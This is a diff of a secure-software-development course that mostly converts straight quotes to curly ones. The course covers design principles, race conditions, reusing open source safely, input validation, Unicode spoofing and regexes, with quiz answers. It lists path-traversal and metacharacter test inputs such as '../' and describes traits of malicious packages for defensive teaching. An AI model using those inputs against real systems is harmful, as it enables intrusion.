 1. **Economy of mechanism (aka simplicity)**. The system, in particular the part that security depends on, should be as simple and small as possible. This makes that part of the system easier to review and harder to get wrong. Of course, modern software is often asked to provide lots of functionality, so you typically cannot make everything extremely simple, but you can at least work to make the part that security depends on as simple as possible.
 
-2. **Open design**. The protection mechanism must not depend on attacker ignorance. Instead, the mechanism should be public, depending on the secrecy of relatively few (and easily changeable) items like passwords or private keys. An open design makes extensive public scrutiny possible. An open design also makes it possible for users to convince themselves that the system about to be used is adequate. Frankly, it is not realistic to try to maintain secrecy for a system that is widely distributed; decompilers and subverted hardware can quickly expose any "secrets" in an implementation. One of the big advantages of open source software (OSS) is that it better implements the open design principle; OSS source code has an open design, enabling anyone else to review it and make changes to potentially improve it. Of course, the OSS has to *actually* be reviewed for this to help, but it is an important *potential* advantage.
+2. **Open design**. The protection mechanism must not depend on attacker ignorance. Instead, the mechanism should be public, depending on the secrecy of relatively few (and easily changeable) items like passwords or private keys. An open design makes extensive public scrutiny possible. An open design also makes it possible for users to convince themselves that the system about to be used is adequate. Frankly, it is not realistic to try to maintain secrecy for a system that is widely distributed; decompilers and subverted hardware can quickly expose any “secrets” in an implementation. One of the big advantages of open source software (OSS) is that it better implements the open design principle; OSS source code has an open design, enabling anyone else to review it and make changes to potentially improve it. Of course, the OSS has to *actually* be reviewed for this to help, but it is an important *potential* advantage.
 
 3. **Fail-safe defaults (aka fail-secure defaults)**. The default installation should be the secure installation. If it is not certain that something should be allowed, don’t allow it. For example, don’t distribute software with an empty or default password; instead, *require* that a new password be set when the software is installed. That way, if someone just quickly installs it, it will not have a vulnerability due to a known password.
 
@@ -955,7 +955,7 @@ Let’s briefly look at the rest of the secure design principles identified by S
 
 [!] Make the source code difficult to understand (e.g., use obscure names) so that vulnerabilities will be more difficult to detect. {{ selected: No, if the source code is more difficult to understand, then it will be more difficult for developers to make it secure in the first place. You should strive to keep the system as reasonably simple as you can. }}
 
-[ ] Ensure that the design of the security mechanism is secret so that it will be more difficult to discover problems in it. {{ selected: No, a long-understood principle is "open design" - the system must be secure even if the design of the security mechanism is public. Sooner or later its design will be revealed, and you might not know when that has occurred. It is better to ensure that it will be secure even if how it works is well-known. }}
+[ ] Ensure that the design of the security mechanism is secret so that it will be more difficult to discover problems in it. {{ selected: No, a long-understood principle is “open design” - the system must be secure even if the design of the security mechanism is public. Sooner or later its design will be revealed, and you might not know when that has occurred. It is better to ensure that it will be secure even if how it works is well-known. }}
 
 [x] The software should be secure by default.
 
@@ -983,7 +983,7 @@ In many situations, the right way to counter TOCTOU race conditions is to implem
 
 3. If you want to create a new file on a Unix-like system, make sure you request that it be created *exclusively* (**O_EXCL** in the C **open()** API, and the letter **x** in **fopen()** and the option flags used in many other programming languages). Again, that way there is no window of opportunity for an attacker to create the file before the program can (if the attacker could do so).
 
-🔔 Race conditions are such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #29. *Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')* is [CWE-362](https://cwe.mitre.org/data/definitions/362.html).
+🔔 Race conditions are such a common cause of security vulnerabilities that it is 2019 CWE Top 25 #29. *Concurrent Execution using Shared Resource with Improper Synchronization (‘Race Condition’)* is [CWE-362](https://cwe.mitre.org/data/definitions/362.html).
 
 #### Harden the System
 
@@ -1003,7 +1003,7 @@ In general, only trust information (input or results) from trustworthy channels.
 
 #### Separate Data from Control
 
-A useful trick for developing more secure software is to separate data from control (aka programs). Put another way, you should separate the passive data from programs that are executed. That way, if an attacker manages to slip in "extra" information into data, that will not cause a potentially-malicious program to be executed. This is basically another way to implement least privilege - don’t give data the right to run as a program.
+A useful trick for developing more secure software is to separate data from control (aka programs). Put another way, you should separate the passive data from programs that are executed. That way, if an attacker manages to slip in “extra” information into data, that will not cause a potentially-malicious program to be executed. This is basically another way to implement least privilege - don’t give data the right to run as a program.
 
 A good example of this is the Content Security Policy (CSP) supported by modern web browsers. CSP lets you state that the HTML being sent is only data, and is *not* allowed to provide inline scripts (programs) or styles (which can also be programs) - instead, the scripts and styles may only be downloaded from specified trusted places. That way, if an attacker manages to subvert the HTML, the attacker will not be able to cause attacker-provided programs to be run.
 
@@ -1013,11 +1013,11 @@ A good example of this is the Content Security Policy (CSP) supported by modern 
 
 [!x] Design and implement systems to ensure that after a request has been authorized, an attacker cannot change something relevant to that decision before the request is acted on. {{ unselected: This is important, it is called a time-of-check/time-of-use (TOCTOU) race condition. }}
 
-[x] Modify the system’s design and configuration so that compromise is less likely *even* if there is a defect. {{ unselected: This is true, it is called "hardening" a system. }}
+[x] Modify the system’s design and configuration so that compromise is less likely *even* if there is a defect. {{ unselected: This is true, it is called “hardening” a system. }}
 
 [ ] Put passwords and secret keys in the source code, so that the system can quickly get and use that information without depending on external components or data stores. {{ selected: No, please do *not* do that. Passwords and secret keys should not be in source code. If they re not in source code, people who can see the source code will not get the secret information, and keeping them out of source code also makes passwords and keys easier to change. }}
 
-[ ] Include control (including programs) with data, so that how to manipulate the data is easily provided with the code. {{ selected: That can be useful, but it is also dangerous from a security point of view. If an attacker manages to slip in "extra" information into data, this design can make it easy to cause a potentially-malicious program to be executed. Sometimes it is important to do this anyway, but it does create more complications when developing secure software. }}
+[ ] Include control (including programs) with data, so that how to manipulate the data is easily provided with the code. {{ selected: That can be useful, but it is also dangerous from a security point of view. If an attacker manages to slip in “extra” information into data, this design can make it easy to cause a potentially-malicious program to be executed. Sometimes it is important to do this anyway, but it does create more complications when developing secure software. }}
 
 # 3. Reusing External Software
 
@@ -1049,7 +1049,7 @@ Some consider the selection of reused software as part of design, since it clear
 
 If you are purchasing expensive software you selected on behalf of an organization, there are often many steps and processes to work through, primarily focused on controlling money. That is outside the scope of this course. Instead, we are going to focus on the specific aspects related to security.
 
-We’ll use the term "reused software" here, because that is our concern. This reused software includes all the software you depend on when the software runs, aka its dependencies. In practice, the vast majority of the software you reuse will be open source software (OSS), so we will especially focus on tips when reusing OSS.
+We’ll use the term “reused software” here, because that is our concern. This reused software includes all the software you depend on when the software runs, aka its dependencies. In practice, the vast majority of the software you reuse will be open source software (OSS), so we will especially focus on tips when reusing OSS.
 
 ### Selecting Reusable Software
 
@@ -1057,7 +1057,7 @@ There are many important things to consider when selecting reusable software. Fo
 
 1. Is it *easy to use securely*? If something is hard to use *securely* the result is far more likely to be insecure.
 
-    1. Look at the defaults of its interface and configuration. Is its API secure by default, or are "simple examples" using the defaults also insecure?
+    1. Look at the defaults of its interface and configuration. Is its API secure by default, or are “simple examples” using the defaults also insecure?
 
     2. If it has a discussion about how to use it securely, that is generally a good sign, especially if it is clear that its warnings recommend that you keep its defaults.
     
@@ -1069,7 +1069,7 @@ There are many important things to consider when selecting reusable software. Fo
 
     2. Is there evidence that the developers use tools to detect defects and vulnerabilities as early as possible?
 
-    3. Is there documentation explaining why its developers believe it is secure (aka an "assurance case")?
+    3. Is there documentation explaining why its developers believe it is secure (aka an “assurance case”)?
 
     4. Is there evidence of a security audit, and that any problems found were fixed? Security audits are relatively uncommon, but they are a great sign when they exist. An audit that finds a large number of vulnerabilities could have found them because the software is just full of vulnerabilities, or because the audit was thorough, but no matter what, if the problems were found and fixed, those problems no longer exist in the version you plan to use.
 
@@ -1077,7 +1077,7 @@ There are many important things to consider when selecting reusable software. Fo
     
     This entire course discusses how to develop secure software; the more of these actions you see in the software you are considering, the better!
 
-3. Is it *maintained*? Unmaintained software is a risk. If the software is not maintained, it is more likely to have serious unaddressed security vulnerabilities, and it is more likely that its developers will fail to quickly fix vulnerabilities when they are reported. In theory, software can be "completed" and not need future changes, but usually software that is not being changed is not being maintained.
+3. Is it *maintained*? Unmaintained software is a risk. If the software is not maintained, it is more likely to have serious unaddressed security vulnerabilities, and it is more likely that its developers will fail to quickly fix vulnerabilities when they are reported. In theory, software can be “completed” and not need future changes, but usually software that is not being changed is not being maintained.
 
     1. If the software is OSS, you can generally look at its repository and see its commit history. If it continues to have active commits, especially by multiple people, that is a good sign. An OSS component with no changes in the last year is generally much riskier.
 
@@ -1097,7 +1097,7 @@ There are many important things to consider when selecting reusable software. Fo
 
     2. Is there evidence of insecure or woefully incomplete software (such as a forest of TODO statements)?
 
-    3. What are the "top" problems reported when running it through static analysis tools (that examine the code to look for problems)?
+    3. What are the “top” problems reported when running it through static analysis tools (that examine the code to look for problems)?
 
     4. Is there evidence that the software is malicious? The authors of [*Backstabber’s Knife Collection: A Review of Open Source Software Supply Chain Attacks*](https://arxiv.org/abs/2005.09535) (2020) article notes traits that are especially common in malicious packages: most malicious packages perform malicious actions during installation (so check the installation routines), most aim at data exfiltration (so check for extraction and sending of data like **~/.ssh** or environment variables), and about half use some sort of obfuscation (so look for encoded values that end up being executed). You could also run the software in a sandbox with an environment intended to trigger likely issues, and see if the software attempts to do something malicious. Some malicious software detects that it is being examined and behaves well when examined, so running code in a sandbox does not guarantee detection… but it may reduce risk.
 
@@ -1117,7 +1117,7 @@ There are many important things to consider when selecting reusable software. Fo
 
 Of course, if you download and install a subverted version of the reused software, that could be a serious problem. So make sure that you get the *correct* version of the software:
 
-1. Make sure you have exactly the correct name. A common attack is called "typosquatting". In typosquatting, an attacker will create a domain name or package name that is intentionally and maliciously similar to a widely-used software component, and use that misleading name to spread a malicious version of that software. [Ohm & all, 2020](https://arxiv.org/abs/2005.09535) found that *“most malicious [OSS] packages mimic existing packages’ names via typosquatting”*. For example:
+1. Make sure you have exactly the correct name. A common attack is called “typosquatting”. In typosquatting, an attacker will create a domain name or package name that is intentionally and maliciously similar to a widely-used software component, and use that misleading name to spread a malicious version of that software. [Ohm & all, 2020](https://arxiv.org/abs/2005.09535) found that *“most malicious [OSS] packages mimic existing packages’ names via typosquatting”*. For example:
 
     1. Check for common misleading name changes. It is easy to switch between dash (**-**) and underscore (**&#95;**). One (**1**) and lower-case L (**l**) look similar, as do zero (**0**) and capital O (**O**). In some package managers, uppercase and lowercase ASCII are considered different; in those situations, beware of case. Unicode provides characters that appear exactly the same as ASCII, but are another alphabet, like Cyrillic or Greek; in some cases, these can also be exploited.
 
@@ -1159,7 +1159,7 @@ In practice, you will have many reused software components, and they will need t
 
 3. *Expect* that you will be updating the software you use, including your underlying platform. It is foolish to assume that software will never need to be rapidly updated.
 
-4. Do not modify OSS and create your own "local fork". If a vulnerability is fixed in a later version of that OSS, it will become increasingly difficult to incorporate that fix. Instead, if you need to modify some OSS to fit your needs, work with the original upstream OSS project to get your improvements incorporated into the official version. Then newer versions of that OSS, including ones that fix vulnerabilities, will also include the capabilities you need.
+4. Do not modify OSS and create your own “local fork”. If a vulnerability is fixed in a later version of that OSS, it will become increasingly difficult to incorporate that fix. Instead, if you need to modify some OSS to fit your needs, work with the original upstream OSS project to get your improvements incorporated into the official version. Then newer versions of that OSS, including ones that fix vulnerabilities, will also include the capabilities you need.
 
 5. Keep your reused software relatively up-to-date. If your reused components go very far out-of-date, then it may be very difficult to replace a vulnerable version with a fixed version.
 
@@ -1167,7 +1167,7 @@ In practice, you will have many reused software components, and they will need t
 
 > 😱 STORY TIME: Equifax
 
-> The widely-used program Apache Struts had a critical vulnerability that was fixed on 2017-03-06 and widely reported by the computer press. The data broker Equifax was notified by Apache, US CERT, and the US Department of Homeland Security about the vulnerability, and was provided instructions on how to make the fix. However, Equifax failed to implement a timely update. *"Two months later, Equifax had still failed to patch its systems. It eventually got around to it on July 29. The attackers used the vulnerability to access the company's databases and steal consumer information on May 13, over two months after Equifax should have patched the vulnerability." Equifax reported that “145.5 million US customers, about 44% of the [US] population, were impacted by the breach... The attackers got access to … exactly the sort of information criminals can use to impersonate victims to banks, credit card companies, insurance companies, cell phone companies and other businesses vulnerable to fraud. As a result, all 143 million US victims are at greater risk of identity theft, and will remain at risk for years to come. And those who suffer identity theft will have problems for months, if not years, as they work to clean up their name and credit rating.”* (Bruce Schneier, [*Me on the Equifax Breach: Testimony and Statement for the Record of Bruce Schneier*](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html),  2017)
+> The widely-used program Apache Struts had a critical vulnerability that was fixed on 2017-03-06 and widely reported by the computer press. The data broker Equifax was notified by Apache, US CERT, and the US Department of Homeland Security about the vulnerability, and was provided instructions on how to make the fix. However, Equifax failed to implement a timely update. *“Two months later, Equifax had still failed to patch its systems. It eventually got around to it on July 29. The attackers used the vulnerability to access the company’s databases and steal consumer information on May 13, over two months after Equifax should have patched the vulnerability.” Equifax reported that “145.5 million US customers, about 44% of the [US] population, were impacted by the breach... The attackers got access to … exactly the sort of information criminals can use to impersonate victims to banks, credit card companies, insurance companies, cell phone companies and other businesses vulnerable to fraud. As a result, all 143 million US victims are at greater risk of identity theft, and will remain at risk for years to come. And those who suffer identity theft will have problems for months, if not years, as they work to clean up their name and credit rating.”* (Bruce Schneier, [*Me on the Equifax Breach: Testimony and Statement for the Record of Bruce Schneier*](https://www.schneier.com/blog/archives/2017/11/me_on_the_equif.html),  2017)
 
 #### Updating How You Use Reused Software (Avoid/Replace Obsolete Interfaces)
 
@@ -1215,7 +1215,7 @@ This section discusses how to implement secure software. We will do that by cons
 
 Almost all programs have inputs (that you should validate), process data, call out occasionally to other programs, and eventually produce output(s). Calling out to another program creates (essentially) inputs to those other programs, and outputs from those other programs. The next few subsections will discuss each of those areas in turn. We will then discuss a few specialized topics.
 
-Of course, just saying *"write secure code"* or *“don’t make mistakes”* is not helpful. The good news is that nearly all errors that cause vulnerabilities today can be grouped into a relatively small number of categories, and some of those categories are especially common. So as noted earlier, we can eliminate a vast majority of security vulnerabilities simply by learning about these categories, knowing how to look for them, and mitigating them. We will repeatedly mention the OWASP Top 10 List (for web applications) and CWE Top 25 List (for applications in general), as they provide a useful way to identify what is most important.
+Of course, just saying *“write secure code”* or *“don’t make mistakes”* is not helpful. The good news is that nearly all errors that cause vulnerabilities today can be grouped into a relatively small number of categories, and some of those categories are especially common. So as noted earlier, we can eliminate a vast majority of security vulnerabilities simply by learning about these categories, knowing how to look for them, and mitigating them. We will repeatedly mention the OWASP Top 10 List (for web applications) and CWE Top 25 List (for applications in general), as they provide a useful way to identify what is most important.
 
 A few of the common kinds of vulnerabilities are design problems. However, most of the rest are implementation issues. As we walk through our model of a program, we will discuss the relevant kinds of vulnerabilities, including how to detect them and counter them. Once you start applying this information, you will find that many vulnerabilities vanish from your program.
 
@@ -1261,7 +1261,7 @@ You should determine what is legal, as narrowly as you reasonably can, and rejec
 
 The good news is that it usually does not take long to add input validation, and that can immediately make your program harder to attack. It may be hard to decide on a user-friendly response to invalid input, but it is easier than suffering a successful attack.
 
-There is a good reason for identifying *illegal* values, though, and that is for use as a set of tests to be sure that your validation code is thorough. These tests may possibly just be executed in your head, but at least a few should become test cases in your automated test suite. When we set up an input filter, we mentally attack our allowlist with a few pre-identified illegal values to make sure that a few obvious illegal values will not get through. Depending on the input, here are a few examples of common illegal values that your input filters may need to prevent: the empty string, "**.**", “**..**”, “**../**”, anything starting with “**/**” or “**.**”, anything with “**/**” or “**&**” inside it, common metacharacters (like semicolon, single quote, double quote, and the less-than symbol), and any control characters (especially the NUL character and newline). Where numbers are expected, checking for other kinds of text that should not be allowed. Also check for very, very long inputs.
+There is a good reason for identifying *illegal* values, though, and that is for use as a set of tests to be sure that your validation code is thorough. These tests may possibly just be executed in your head, but at least a few should become test cases in your automated test suite. When we set up an input filter, we mentally attack our allowlist with a few pre-identified illegal values to make sure that a few obvious illegal values will not get through. Depending on the input, here are a few examples of common illegal values that your input filters may need to prevent: the empty string, “**.**”, “**..**”, “**../**”, anything starting with “**/**” or “**.**”, anything with “**/**” or “**&**” inside it, common metacharacters (like semicolon, single quote, double quote, and the less-than symbol), and any control characters (especially the NUL character and newline). Where numbers are expected, checking for other kinds of text that should not be allowed. Also check for very, very long inputs.
 
 Later, we will discuss various kinds of security analysis tools. One kind, fuzzers, intentionally create a large number of malicious inputs that (among other things) test the quality of your input validation checks. But fuzzers do not guarantee to find all input validation problems. Instead, carefully implement your input validation, and then use tools to help you find problems you would have otherwise missed.
 
@@ -1277,7 +1277,7 @@ Again, your code should use *allowlisting* (narrowly identifying what is legal a
 
 [Explanation]
 
-In general, you should use *allowlisting*, not *denylisting*. Attackers can always come up with another attack, so trying to come up with a list of "everything that should be denied" is a never-ending task. It is generally better to narrowly determine what should be allowed, and then reject everything else.
+In general, you should use *allowlisting*, not *denylisting*. Attackers can always come up with another attack, so trying to come up with a list of “everything that should be denied” is a never-ending task. It is generally better to narrowly determine what should be allowed, and then reject everything else.
 
 [Explanation]
 
@@ -1293,7 +1293,7 @@ One common input is a sequence of characters representing a number. Typically, y
 
 Where practical, store the numeric result in a type that is narrowly defined for the purpose. For example, store the number in an integer type if the number is an integer, use an unsigned type if negative numbers are not allowed, and so on. If you have to accept floating point data from an untrusted user (and try not to!), store it in an appropriate type and watch out for its many special cases (such as NaN, infinities, negative 0, underflows, and overflows). For example, normally the floating point value NaN is not equal to any value; it is not even equal to itself. Limiting the type is not always practical because this is very language-dependent; not all languages have such types. For example, JavaScript does not have an unsigned type.
 
-Note that *"only allow an integer between 0 and 200 including those endpoints"* is an allowlist; you have identified the pattern of what is allowed, and anything else will be rejected.
+Note that *“only allow an integer between 0 and 200 including those endpoints”* is an allowlist; you have identified the pattern of what is allowed, and anything else will be rejected.
 
 #### Well-Known Special Text Formats
 
@@ -1325,37 +1325,37 @@ Often you receive text as input (either directly or as part of some larger struc
 
 #### Code Points and Encoding
 
-Digital computers do not directly handle characters; we instead need to assign a number to each character. Different character sets with different assignments were created for different languages, and this created interoperability nightmares. In the vast majority of cases today you will use the character assignments specified by Unicode and ISO/IEC 10646, which define a Universal Character Set (UCS) that assigns a unique number (*code point*) for every character. For example, they assign the Latin character capital "A" the decimal number 65.
+Digital computers do not directly handle characters; we instead need to assign a number to each character. Different character sets with different assignments were created for different languages, and this created interoperability nightmares. In the vast majority of cases today you will use the character assignments specified by Unicode and ISO/IEC 10646, which define a Universal Character Set (UCS) that assigns a unique number (*code point*) for every character. For example, they assign the Latin character capital “A” the decimal number 65.
 
-Historically, it was thought that 16 bits would be enough to identify all characters, but this was mistaken and was changed in 1996 (they now use 21 bits to encode any character). As a result of this mistake, some programming languages have a "character" type (e.g., Java’s **char**) that is only 16 bits long. A 16-bit data type cannot, by itself, store any arbitrary 21-bit character, so in programming languages and APIs with a 16-bit “character”, a “character” is sometimes only half of an actual character.
+Historically, it was thought that 16 bits would be enough to identify all characters, but this was mistaken and was changed in 1996 (they now use 21 bits to encode any character). As a result of this mistake, some programming languages have a “character” type (e.g., Java’s **char**) that is only 16 bits long. A 16-bit data type cannot, by itself, store any arbitrary 21-bit character, so in programming languages and APIs with a 16-bit “character”, a “character” is sometimes only half of an actual character.
 
-Text that uses these assignments need to be exchanged using an *encoding*. There are five standard encodings for Unicode: UTF-32 (big-endian and little-endian), UTF-16 (big-endian and little-endian), and UTF-8. Generally, you should use UTF-8 unless you have a reason to do otherwise. UTF-16 and UTF-32 both have two forms: "little endian" and “big endian”. If you don’t know if the recipient expects big-endian or little-endian, you should add a *byte order marker* at the beginning of the text to make sure that the receiver interprets it correctly, and when receiving UTF-16 or UTF-32, your application needs to pay attention to that. A critical issue is that some sequences of bytes are *not* valid, so when we do input validation, we will need to ensure that the data we receive is valid for the encoding we expect.
+Text that uses these assignments need to be exchanged using an *encoding*. There are five standard encodings for Unicode: UTF-32 (big-endian and little-endian), UTF-16 (big-endian and little-endian), and UTF-8. Generally, you should use UTF-8 unless you have a reason to do otherwise. UTF-16 and UTF-32 both have two forms: “little endian” and “big endian”. If you don’t know if the recipient expects big-endian or little-endian, you should add a *byte order marker* at the beginning of the text to make sure that the receiver interprets it correctly, and when receiving UTF-16 or UTF-32, your application needs to pay attention to that. A critical issue is that some sequences of bytes are *not* valid, so when we do input validation, we will need to ensure that the data we receive is valid for the encoding we expect.
 
 #### Locales
 
-Interpreting characters is more complicated than you might think. Much depends on the "locale", which defines the user’s language, country/region, user interface preferences, and probably character encoding. For example, on Unix/Linux systems, Australian English with UTF-8 encoding is represented as the locale **en_AU.UTF-8**. Locale is important, because it affects how characters are interpreted. For example, it affects:
+Interpreting characters is more complicated than you might think. Much depends on the “locale”, which defines the user’s language, country/region, user interface preferences, and probably character encoding. For example, on Unix/Linux systems, Australian English with UTF-8 encoding is represented as the locale **en_AU.UTF-8**. Locale is important, because it affects how characters are interpreted. For example, it affects:
 
 * Collation (sorting) order
 
-* Character classification (what is a "letter"?). Ranges like “A-Za-z” do not list *all the alphabetic characters* in arbitrary locales. If you use the C or POSIX locale and are only processing ASCII characters, then that range is the complete list of alphabetic characters, but that is not true in general.
+* Character classification (what is a “letter"?). Ranges like “A-Za-z” do not list *all the alphabetic characters* in arbitrary locales. If you use the C or POSIX locale and are only processing ASCII characters, then that range is the complete list of alphabetic characters, but that is not true in general.
 
 * Case conversion (what is upper/lower case of a character, if it exists?). Note that even if there is a conversion, it might not convert to a single character in a given locale.
 
-If you want to interpret text in the same way regardless of locale, the usual solution is to use the "C" aka “POSIX” locale - however, be careful, because that is not always what the user wanted.
+If you want to interpret text in the same way regardless of locale, the usual solution is to use the “C” aka “POSIX” locale - however, be careful, because that is not always what the user wanted.
 
 Case conversion is especially fraught. Some languages don’t have upper and lower case letters. Even if they do, the mapping between them is different between different locales. So the uppercase version of a letter is *not* fixed - it is based on the locale!
 
-A great example of this are the Turkic languages that use the Turkish alphabet. In this alphabet dotted and dotless "I" are distinct letters with upper and lower case forms. For example, lowercase dotted “i” when capitalized becomes capital dotted “İ” (not uppercase dotless “I” as it does in an English locale), and uppercase dotless “I” when lowercased becomes lowercase dotless “ı”. Note that “i” and “I” are *not* equal in a case-insensitive match in a correctly-implemented system for such locales. This has resulted in several security vulnerabilities, and we will occasionally mention this in the course because it is a great example of the kinds of mistakes that can happen if you are not aware of it.
+A great example of this are the Turkic languages that use the Turkish alphabet. In this alphabet dotted and dotless “I” are distinct letters with upper and lower case forms. For example, lowercase dotted “i” when capitalized becomes capital dotted “İ” (not uppercase dotless “I” as it does in an English locale), and uppercase dotless “I” when lowercased becomes lowercase dotless “ı”. Note that “i” and “I” are *not* equal in a case-insensitive match in a correctly-implemented system for such locales. This has resulted in several security vulnerabilities, and we will occasionally mention this in the course because it is a great example of the kinds of mistakes that can happen if you are not aware of it.
 
-If you want to know if "two sequences of characters are equivalent" ignoring case, then in the general case you need to call a routine to do this *and* provide it the locale to use. This raises the issues about equivalence in general, which we will discuss next.
+If you want to know if “two sequences of characters are equivalent” ignoring case, then in the general case you need to call a routine to do this *and* provide it the locale to use. This raises the issues about equivalence in general, which we will discuss next.
 
 #### Unicode Equivalence
 
-Many programmers assume that if a sequence of text "code points" are different, they are different strings. While that is fine for some purposes, that is the wrong mental model for others, even if you assume that you want a “case sensitive” match. Unicode had to be developed in a way that was compatible with pre-existing standards, and that led to some complications.
+Many programmers assume that if a sequence of text “code points” are different, they are different strings. While that is fine for some purposes, that is the wrong mental model for others, even if you assume that you want a “case sensitive” match. Unicode had to be developed in a way that was compatible with pre-existing standards, and that led to some complications.
 
-In some cases you should use library routines to test for Unicode canonical equivalence. That is because there are some code points, or sequences of code points, that in many circumstances should be considered *equivalent* in the sense that they should always appear identical, even if they have different underlying values. For example, the code point U+006E (the Latin lowercase "n") followed by U+0303 (the combining tilde "◌̃") is canonically equivalent to code point U+00F1 ("ñ").  Another example is the character "Å" that can be represented as U+00C5 (the letter "LATIN CAPITAL LETTER A WITH RING ABOVE") or as U+212B ("ANGSTROM SIGN"): these two values should be considered equivalent.
+In some cases you should use library routines to test for Unicode canonical equivalence. That is because there are some code points, or sequences of code points, that in many circumstances should be considered *equivalent* in the sense that they should always appear identical, even if they have different underlying values. For example, the code point U+006E (the Latin lowercase “n”) followed by U+0303 (the combining tilde “◌̃”) is canonically equivalent to code point U+00F1 (“ñ”).  Another example is the character “Å” that can be represented as U+00C5 (the letter “LATIN CAPITAL LETTER A WITH RING ABOVE”) or as U+212B (“ANGSTROM SIGN”): these two values should be considered equivalent.
 
-In some other cases, you should use routines to test for Unicode compatibility. That is because there are some sequences that might appear different but would have the same underlying meaning. For example, the code point U+FB00 (typographic "ﬀ") is compatible, but not equivalent, to U+0066 U+0066 (two Latin "f" letters). Equivalent strings are always compatible, but compatible strings are not always equivalent.
+In some other cases, you should use routines to test for Unicode compatibility. That is because there are some sequences that might appear different but would have the same underlying meaning. For example, the code point U+FB00 (typographic “ﬀ”) is compatible, but not equivalent, to U+0066 U+0066 (two Latin “f” letters). Equivalent strings are always compatible, but compatible strings are not always equivalent.
 
 This is a pain, so the Unicode standard defines text normalization procedures, called Unicode normalization. Unicode normalization turns equivalent or compatible sequences into the exact same sequence of characters. There are 4 normalization forms:
 
@@ -1373,17 +1373,17 @@ From a security point-of-view it normally does not matter *which* Unicode normal
 
 *Visual spoofing* happens when two different strings are mistaken as being the *same* by the user. Attackers will sometimes use visual spoofing as part of an attack.
 
-Visual spoofing can even happen in the ASCII subset of Unicode. The digit "0" looks like the uppercase letter “O”, and the digit “1” looks like the lowercase letter “l”. For example, an attacker might try to create a malicious **paypa1.com** domain instead of **paypal.com**. The sequence “rn” is sometimes misread as the letter “m”! That said, most users of Latin alphabets are aware of these problems, and many fonts take care to make them more distinguishable.
+Visual spoofing can even happen in the ASCII subset of Unicode. The digit “0” looks like the uppercase letter “O”, and the digit “1” looks like the lowercase letter “l”. For example, an attacker might try to create a malicious **paypa1.com** domain instead of **paypal.com**. The sequence “rn” is sometimes misread as the letter “m”! That said, most users of Latin alphabets are aware of these problems, and many fonts take care to make them more distinguishable.
 
 But once we move beyond the ASCII subset, many other tricks exist:
 
-* Decomposition<br>"ƶ" may be expressed as U+007A U+0335 (z + combining short stroke overlay) or as U+01B6. This means that different sequences of bytes may still indicate the same letter (and thus look identical). Normalization solves this problem.
+* Decomposition<br>“ƶ” may be expressed as U+007A U+0335 (z + combining short stroke overlay) or as U+01B6. This means that different sequences of bytes may still indicate the same letter (and thus look identical). Normalization solves this problem.
 
-* Mixed-script<br>Greek omicron & Latin "o" typically look the same, even though they are in different sections of Unicode.
+* Mixed-script<br>Greek omicron & Latin “o” typically look the same, even though they are in different sections of Unicode.
 
-* Same-script<br>Some characters simply look similar. E.g., "-" Hyphen-minus U+002D vs. hyphen “‐” U+2010.
+* Same-script<br>Some characters simply look similar. E.g., “-” Hyphen-minus U+002D vs. hyphen “‐” U+2010.
 
-* Bidirectional Text Spoofing<br>Some languages are mostly right-to-left, but switch in certain situations to left-to-right. Thus, Unicode includes mechanisms to indicate direction. But this means that the string "olleh", surrounded by “use right-to-left”, will visually look the same as “hello”.
+* Bidirectional Text Spoofing<br>Some languages are mostly right-to-left, but switch in certain situations to left-to-right. Thus, Unicode includes mechanisms to indicate direction. But this means that the string “olleh”, surrounded by “use right-to-left”, will visually look the same as “hello”.
 
 Visual spoofing can be very challenging to counter in general. Normalization and using distinctive fonts is not always enough, but it can sometimes be very helpful.
 
@@ -1397,7 +1397,7 @@ Visual spoofing can be very challenging to counter in general. Normalization and
 
 [Explanation]
 
-There are simply too many characters to encode them all in 16 bits, so Unicode now uses 21 bits to encode characters. Many languages and APIs use 16-bit "character" values, but if they are to represent all Unicode characters, sometimes these characters are only *part* of an actual character.
+There are simply too many characters to encode them all in 16 bits, so Unicode now uses 21 bits to encode characters. Many languages and APIs use 16-bit “character” values, but if they are to represent all Unicode characters, sometimes these characters are only *part* of an actual character.
 
 [Explanation]
 
@@ -1429,19 +1429,19 @@ However, some software developers have never used regexes. This unit provides a 
 
 Historically regexes were developed to make it easy to search for text, though they are now often used to determine if some text matches a pattern. There are many implementations of regex systems, but since they all come from the same historical root they have much in common.
 
-The most trivial rule is that a letter or digit matches itself. That is, the regex "**d**" matches the letter “**d**”. Most implementations use case-sensitive matches by default, and that is usually what you want.
+The most trivial rule is that a letter or digit matches itself. That is, the regex “**d**” matches the letter “**d**”. Most implementations use case-sensitive matches by default, and that is usually what you want.
 
-Another rule is that square brackets surround a rule that specifies any of a number of characters. If the square brackets surround just alphanumerics, then the pattern matches any of them. So **[brt]** matches a single "**b**", “**r**”, or “**t**”.
+Another rule is that square brackets surround a rule that specifies any of a number of characters. If the square brackets surround just alphanumerics, then the pattern matches any of them. So **[brt]** matches a single “**b**”, “**r**”, or “**t**”.
 
-The pattern "**.**" matches any one character, with the possible exception of the newline character. If you want to match a literal period, precede it with a backslash (“**\.**”). Practically every implementation of regexes has a mechanism to let you decide if “**.**” should match a newline.
+The pattern “**.**” matches any one character, with the possible exception of the newline character. If you want to match a literal period, precede it with a backslash (“**\.**”). Practically every implementation of regexes has a mechanism to let you decide if “**.**” should match a newline.
 
-A regex pattern is usually a sequence of rules, stated one after the other. For example, the regex pattern "**ca[brt]**" will match the text “**cab**”, “**car**”, or “**cat**”, because the letters “**c**” and “**a**” match themselves, and “**[brt]**” matches a single “**b**”, “**r**”, or “**t**”.
+A regex pattern is usually a sequence of rules, stated one after the other. For example, the regex pattern “**ca[brt]**” will match the text “**cab**”, “**car**”, or “**cat**”, because the letters “**c**” and “**a**” match themselves, and “**[brt]**” matches a single “**b**”, “**r**”, or “**t**”.
 
-In fact, by default, regexes *search* for the given pattern in a string. That is, normally a regex implementation will see if a pattern matches some text if it starts at the first character, then second character, and so on, reporting if it can find *any* match. So the pattern "**ca[brt]**" will also match “**abdicate**” because there is a “**cat**” in the word “**abdicate**”.
+In fact, by default, regexes *search* for the given pattern in a string. That is, normally a regex implementation will see if a pattern matches some text if it starts at the first character, then second character, and so on, reporting if it can find *any* match. So the pattern “**ca[brt]**” will also match “**abdicate**” because there is a “**cat**” in the word “**abdicate**”.
 
